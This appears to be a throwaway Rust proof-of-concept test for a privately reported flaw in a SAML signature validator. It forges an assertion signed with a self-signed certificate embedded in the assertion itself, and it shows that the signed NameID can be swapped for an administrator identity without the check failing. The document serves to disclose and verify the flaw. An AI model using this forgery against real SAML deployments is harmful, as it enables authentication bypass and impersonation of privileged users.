//! THROWAWAY demonstration for a private finding. Not to be committed.
#![cfg(feature = "saml")]

use auth_framework::methods::saml::{SamlSignatureValidator, XmlCanonicalizer};
use base64::{Engine, engine::general_purpose::STANDARD as B64};
use ring::signature::{ECDSA_P256_SHA256_ASN1_SIGNING, EcdsaKeyPair};

fn attacker_assertion(name_id: &str) -> (String, Vec<u8>) {
    let key = rcgen::KeyPair::generate_for(&rcgen::PKCS_ECDSA_P256_SHA256).unwrap();
    let cert = rcgen::CertificateParams::new(vec!["attacker.example".to_string()])
        .unwrap()
        .self_signed(&key)
        .unwrap();
    let cert_der = cert.der().to_vec();

    let signed_info = "<ds:SignedInfo><ds:Reference><ds:DigestValue>AAAA</ds:DigestValue></ds:Reference></ds:SignedInfo>";
    // What the validator itself reads back out of the document, canonicalized the way it does.
    let probe = format!(
        "<r xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\"><ds:Signature>{signed_info}<ds:SignatureValue>AA==</ds:SignatureValue></ds:Signature></r>"
    );
    let extracted = SamlSignatureValidator.extract_signed_info(&probe).unwrap();
    println!("EXTRACTED: {extracted}");
    let canonical = XmlCanonicalizer::new().canonicalize_xml(&extracted).unwrap();
    println!("CANONICAL: {canonical}");
    let pkcs8 = key.serialize_der();
    let rng = ring::rand::SystemRandom::new();
    let pair = EcdsaKeyPair::from_pkcs8(&ECDSA_P256_SHA256_ASN1_SIGNING, &pkcs8, &rng).unwrap();
    let sig = pair.sign(&rng, canonical.as_bytes()).unwrap();

    let xml = format!(
        "<samlp:Response xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\"><saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\"><saml:Issuer>https://victim-idp.example</saml:Issuer><saml:Subject><saml:NameID>{name_id}</saml:NameID></saml:Subject><ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">{signed_info}<ds:SignatureValue>{}</ds:SignatureValue><ds:KeyInfo><ds:X509Data><ds:X509Certificate>{}</ds:X509Certificate></ds:X509Data></ds:KeyInfo></ds:Signature></saml:Assertion></samlp:Response>",
        B64.encode(sig.as_ref()),
        B64.encode(&cert_der)
    );
    (xml, cert_der)
}

#[test]
fn a_self_signed_assertion_validates_with_its_own_embedded_certificate() {
    let (xml, _) = attacker_assertion("attacker@evil.example");
    let v = SamlSignatureValidator;
    let embedded = v.extract_embedded_certificate(&xml).unwrap();
    // This is exactly what token_exchange::validate_saml_assertion_xml does.
    assert!(v.validate_xml_signature(&xml, &embedded).unwrap());
}

#[test]
fn the_signed_content_can_be_changed_without_breaking_the_signature() {
    let (xml, _) = attacker_assertion("attacker@evil.example");
    let tampered = xml.replace("attacker@evil.example", "admin@victim.example");
    assert_ne!(xml, tampered);
    let v = SamlSignatureValidator;
    let embedded = v.extract_embedded_certificate(&tampered).unwrap();
    assert!(v.validate_xml_signature(&tampered, &embedded).unwrap());
}
